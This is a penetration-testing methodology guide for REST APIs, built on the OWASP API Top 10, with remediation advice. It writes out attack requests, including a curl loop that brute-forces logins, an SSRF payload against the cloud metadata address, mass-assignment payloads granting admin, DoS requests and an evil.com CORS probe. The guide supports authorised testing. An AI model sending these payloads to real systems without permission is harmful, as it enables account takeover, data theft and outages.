# REST API Security Testing

## Overview
REST API security testing identifies vulnerabilities in API design, implementation, and configuration that can lead to unauthorized data access, privilege escalation, and business logic abuse. Modern applications expose significant attack surface through APIs, making them a primary target. This skill covers the OWASP API Security Top 10 and related attack vectors including authentication bypass, broken object-level authorization, mass assignment, rate limiting failures, and excessive data exposure.

## Classification
- **CWE:** CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **OWASP:** API1:2023 - Broken Object Level Authorization, API2:2023 - Broken Authentication, API3:2023 - Broken Object Property Level Authorization, API4:2023 - Unrestricted Resource Consumption, API5:2023 - Broken Function Level Authorization
- **CVSS Base:** 5.3 - 9.8 (Medium to Critical, depending on data exposure and access)
- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts)

## Detection Methodology

### 1. Broken Object Level Authorization (BOLA / IDOR)
Manipulate resource identifiers to access other users' objects:
```
GET /api/v1/users/1001/orders      (own user)
GET /api/v1/users/1002/orders      (another user)
GET /api/v1/orders/50001           (sequential ID)
GET /api/v1/orders/50002           (increment)

# UUID guessing via disclosed references
GET /api/v1/documents/a1b2c3d4-e5f6-7890-abcd-ef1234567890

# Nested resource access
GET /api/v1/organizations/1/users/2/records/3
```
Test every endpoint that accepts a resource identifier. Swap IDs between two authenticated sessions.

### 2. Broken Authentication
```
# Missing auth on endpoints
GET /api/v1/admin/users            (no Authorization header)

# Token manipulation
Authorization: Bearer <expired_token>
Authorization: Bearer <token_from_another_environment>
Authorization: Bearer null
Authorization: Bearer undefined

# Weak token patterns
# Predictable tokens (sequential, timestamp-based, base64-encoded user data)

# Credential stuffing / brute force
POST /api/v1/auth/login            (no rate limiting)
```

### 3. Broken Object Property Level Authorization (Mass Assignment)
Send additional properties the API should not accept:
```json
// Normal request
POST /api/v1/users
{"name": "John", "email": "john@test.com"}

// Mass assignment attempt
POST /api/v1/users
{"name": "John", "email": "john@test.com", "role": "admin", "isVerified": true}

// Via PUT/PATCH
PATCH /api/v1/users/1001
{"role": "admin", "balance": 99999, "approved": true}
```
Discover hidden properties by examining GET responses and API documentation, then inject them in write operations.

### 4. Excessive Data Exposure
```
# Check if API returns more data than the UI displays
GET /api/v1/users/1001
# Response contains: password_hash, ssn, internal_notes, other_users_data

# List endpoints returning full objects
GET /api/v1/users                  (returns all user fields for all users)

# Debug/verbose mode left enabled
GET /api/v1/users/1001?debug=true
GET /api/v1/users/1001?verbose=1
```

### 5. Broken Function Level Authorization (BFLA)
```
# Horizontal privilege escalation
DELETE /api/v1/users/1002          (delete another user's account)

# Vertical privilege escalation
GET /api/v1/admin/dashboard        (user accessing admin endpoints)
POST /api/v1/admin/users           (user creating via admin endpoint)

# HTTP method switching
GET /api/v1/users/1001             (allowed)
PUT /api/v1/users/1001             (should be denied)
DELETE /api/v1/users/1001          (should be denied)

# Endpoint pattern guessing
/api/v1/users       -> /api/v1/admins
/api/v1/orders      -> /api/v1/orders/export
/api/v1/data        -> /api/v1/data/bulk
```

### 6. Unrestricted Resource Consumption
```
# Rate limiting tests
for i in $(seq 1 1000); do curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://target.com/api/v1/auth/login \
  -d '{"user":"admin","pass":"test'$i'"}'; done

# Large payload DoS
POST /api/v1/search
{"query": "A"*1000000}

# Pagination abuse
GET /api/v1/users?limit=999999&offset=0

# Resource-intensive operations
GET /api/v1/reports/generate?from=2000-01-01&to=2025-12-31
POST /api/v1/export?format=csv&include=all
```

### 7. Server-Side Request Forgery via API
```json
POST /api/v1/webhooks
{"url": "http://169.254.169.254/latest/meta-data/"}

POST /api/v1/integrations
{"callback_url": "http://internal-service:8080/admin"}
```

### 8. Security Misconfiguration
```
# CORS misconfiguration
curl -H "Origin: http://evil.com" -I http://target.com/api/v1/users
# Check: Access-Control-Allow-Origin, Access-Control-Allow-Credentials

# Missing security headers
# Check for: X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security

# Exposed API documentation
GET /swagger.json
GET /openapi.json
GET /api-docs
GET /v1/api-docs
GET /swagger/v1/swagger.json
```

## Tool Usage

### Burp Suite
```
# Autorize extension — test BOLA/BFLA automatically
1. Install Autorize extension
2. Configure low-privilege token in Autorize
3. Browse application as high-privilege user
4. Autorize replays requests with low-privilege token
5. Review color-coded results (red = authorization bypass)
```

### ffuf (Endpoint Discovery)
```bash
# Discover API endpoints
ffuf -u http://target.com/api/v1/FUZZ -w /usr/share/wordlists/api-endpoints.txt -mc 200,201,204,301,302,401,403

# Parameter discovery
ffuf -u "http://target.com/api/v1/users?FUZZ=value" -w /usr/share/wordlists/params.txt -fs <baseline_size>

# HTTP method enumeration
ffuf -u http://target.com/api/v1/users -X FUZZ -w methods.txt -mc all -fc 405
```

### Postman / Newman
```bash
# Run API security test collection
newman run api-security-tests.json -e environment.json --reporters cli,json

# Chain requests to test auth flows and BOLA
# Use collection variables to pass tokens between requests
```

### Arjun (Parameter Discovery)
```bash
arjun -u http://target.com/api/v1/endpoint -m GET,POST,JSON
```

### Nuclei
```bash
nuclei -u http://target.com -t http/exposed-panels/ -t http/misconfiguration/
```

## Remediation
1. **Object-level authorization** -- validate user ownership on every object access at the data layer, not just the API layer
2. **Strong authentication** -- enforce OAuth 2.0/OIDC with short-lived tokens, MFA where appropriate
3. **Input schema validation** -- define and enforce strict request schemas; reject unknown properties to prevent mass assignment
4. **Response filtering** -- return only fields required by the client; never expose internal or sensitive fields
5. **Rate limiting** -- implement per-user and per-endpoint rate limits with exponential backoff
6. **Function-level authorization** -- enforce RBAC/ABAC at the middleware layer for every endpoint
7. **Disable unnecessary HTTP methods** -- only allow methods the endpoint requires
8. **API gateway** -- centralize authentication, authorization, rate limiting, and logging

## Evidence Collection
- HTTP request and response pairs demonstrating unauthorized access (BOLA/BFLA)
- Diff between intended data exposure and actual response fields
- Rate limiting test results showing request counts before throttling
- Mass assignment payloads that successfully modified restricted properties
- Screenshots of accessed admin endpoints or other users' data
- API documentation or schema files discovered (swagger.json, openapi.yaml)
- CORS headers showing overly permissive origin policies
